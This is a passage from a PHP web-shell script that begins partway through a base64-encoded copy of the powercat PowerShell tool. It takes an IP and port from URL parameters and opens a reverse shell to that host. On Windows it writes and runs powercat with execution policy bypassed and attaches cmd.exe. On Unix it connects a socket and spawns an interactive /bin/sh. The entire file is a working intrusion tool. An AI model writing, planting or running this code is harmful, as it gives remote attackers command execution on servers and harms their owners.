29sZX0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAkSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRvICsgIicpIikKICB9CgogIGlmKCRlcCl7JEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gTWFpbmBue2BuIiArICR7ZnVuY3Rpb246TWFpbl9Qb3dlcnNoZWxsfSArICJgbn1gbmBuIil9CiAgZWxzZXskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWlufSArICJgbn1gbmBuIil9CiAgJEludm9rZVN0cmluZyA9ICgkRnVuY3Rpb25TdHJpbmcgKyAkSW52b2tlU3RyaW5nKQogICMjIyMjIyMjIyMgR0VORVJBVEUgUEFZTE9BRCAjIyMjIyMjIyMjCgogICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjCiAgaWYoJGdlKXtXcml0ZS1WZXJib3NlICJSZXR1cm5pbmcgRW5jb2RlZCBQYXlsb2FkLi4uIiA7IHJldHVybiBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJEludm9rZVN0cmluZykpfQogIGVsc2VpZigkZyl7V3JpdGUtVmVyYm9zZSAiUmV0dXJuaW5nIFBheWxvYWQuLi4iIDsgcmV0dXJuICRJbnZva2VTdHJpbmd9CiAgIyMjIyMjIyMjIyBSRVRVUk4gR0VORVJBVEVEIFBBWUxPQURTICMjIyMjIyMjIyMKCiAgIyMjIyMjIyMjIyBFWEVDVVRJT04gIyMjIyMjIyMjIwogICRPdXRwdXQgPSAkbnVsbAogIHRyeQogIHsKICAgIGlmKCRyZXApCiAgICB7CiAgICAgIHdoaWxlKCRUcnVlKQogICAgICB7CiAgICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZwogICAgICAgIFN0YXJ0LVNsZWVwIC1zIDIKICAgICAgICBXcml0ZS1WZXJib3NlICJSZXBldGl0aW9uIEVuYWJsZWQ6IFJlc3RhcnRpbmcuLi4iCiAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZwogICAgfQogIH0KICBmaW5hbGx5CiAgewogICAgaWYoJE91dHB1dCAtbmUgJG51bGwpCiAgICB7CiAgICAgIGlmKCRvZiAtZXEgIiIpeyRPdXRwdXR9CiAgICAgIGVsc2V7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvZiwkT3V0cHV0KX0KICAgIH0KICB9CiAgIyMjIyMjIyMjIyBFWEVDVVRJT04gIyMjIyMjIyMjIwp9Cg==';

$wdir = getcwd();
echo $wdir ."<br>";
if(isset($_GET["ip"]) && isset($_GET["port"])) {
    $ip = $_GET["ip"];
    $port = $_GET["port"];
    echo 'v1.1' ."<br>";
    echo $ip ."<br>";
    echo $port ."<br>";

    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Save the decoded script to a file
        $decodedScript = base64_decode($powercatb64encoded);
        $scriptPath = $wdir . "\powercat.ps1";
        file_put_contents($scriptPath, $decodedScript);
        if (file_exists($scriptPath)) {
            echo "Payload copied" ."<br>";
            echo $scriptPath ."<br>";
        } else {
            echo "Payload copy failed" ."<br>";
            exit;
        }
        // Execute the PowerShell script
        $cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -c 'Import-Module $scriptPath; powercat -c $ip -p $port -e cmd.exe'";
        echo $cmd ."<br>";
        $output = shell_exec($cmd); 
        echo $output . '<br>';
    } else {
        // Unix/Linux-specific command
        $sock = fsockopen($ip, $port);
        if($sock) {
            $cmd = "/bin/sh -i <&3 >&3 2>&3";
            echo $cmd ."<br>";
            exec($cmd);
        } else {
            echo "Could not establish a connection." ."<br>";
        }
    }
} else {
    echo "IP or Port parameter is missing." ."<br>";
}
?>
